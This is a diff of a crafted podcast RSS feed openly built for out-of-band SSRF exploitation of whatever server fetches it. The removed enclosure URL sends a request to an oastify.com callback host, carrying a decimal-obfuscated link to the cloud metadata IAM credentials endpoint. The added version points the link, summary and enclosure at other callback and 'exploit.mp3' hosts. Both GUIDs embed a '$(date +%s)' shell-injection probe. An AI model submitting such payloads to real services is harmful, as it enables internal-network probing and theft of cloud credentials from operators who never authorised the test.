@@ -1,17 +1,17 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
   <channel>
-    <title>Hacked Security Research</title>
-    <description>Advanced Technical Analysis and Security Probing</description>
-    <link>https://blog.hackerrank.com</link>
+    <title>Security Audit Test</title>
+    <description>OOB SSRF Testing via Media Metadata</description>
+    <link>http://xrsea31dhrk5ftwqhowh4qstuk0bofc4.oastify.com</link>
     <language>en-us</language>
     <itunes:category text="Technology" />
     <item>
-      <title>Exploit Update v5</title>
-      <description>Analyzing server-side request behavior</description>
-      <enclosure url="http://qe87xwo64k7y2mjj4hjarjfmhdn4b7zw.oastify.com/?data=http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg"/>
-      <guid>unique-$(date +%s)</guid>
-      <pubDate>Fri, 10 Apr 2026 20:00:00 GMT</pubDate>
+      <title>Final Exploit Attempt</title>
+      <enclosure url="https://pub-86646197368d4a6797a7a13629e34a66.r2.dev/exploit.mp3" length="5000" type="audio/mpeg"/>
+      <guid>exploit-$(date +%s)</guid>
+      <pubDate>Fri, 10 Apr 2026 23:00:00 GMT</pubDate>
+      <itunes:summary>Testing connection to http://xrsea31dhrk5ftwqhowh4qstuk0bofc4.oastify.com</itunes:summary>
     </item>
   </channel>
 </rss>
